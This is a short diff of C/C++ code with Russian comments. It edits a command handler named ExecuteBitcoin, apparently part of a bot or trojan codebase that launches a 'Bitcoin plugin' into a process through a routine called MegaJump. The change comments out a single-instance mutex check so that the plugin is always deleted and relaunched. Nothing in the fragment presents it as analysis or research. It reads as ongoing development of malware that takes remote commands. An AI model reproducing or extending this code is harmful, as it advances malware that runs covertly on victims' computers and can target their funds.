@@ -132,17 +132,17 @@ bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	}
 	else //запуск плагина
 	{
-		HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
-		if( mutex != 0 ) //плагин не запущен
-		{
-			pCloseHandle(mutex);
-			MegaJump(ProcessBitcoin);
-		}
-		else //плагин запущен, удаляем и запускаем снова
-		{
+//		HANDLE mutex = TryCreateSingleInstance(mutexBitcoin);
+//		if( mutex != 0 ) //плагин не запущен
+//		{
+//			pCloseHandle(mutex);
+//			MegaJump(ProcessBitcoin);
+//		}
+//		else //плагин запущен, удаляем и запускаем снова
+//		{
 			DeleteBitcoinPlugin();
 			MegaJump(ProcessBitcoin);
-		}
+//		}
 		ret = true;
 	}
 	return ret;
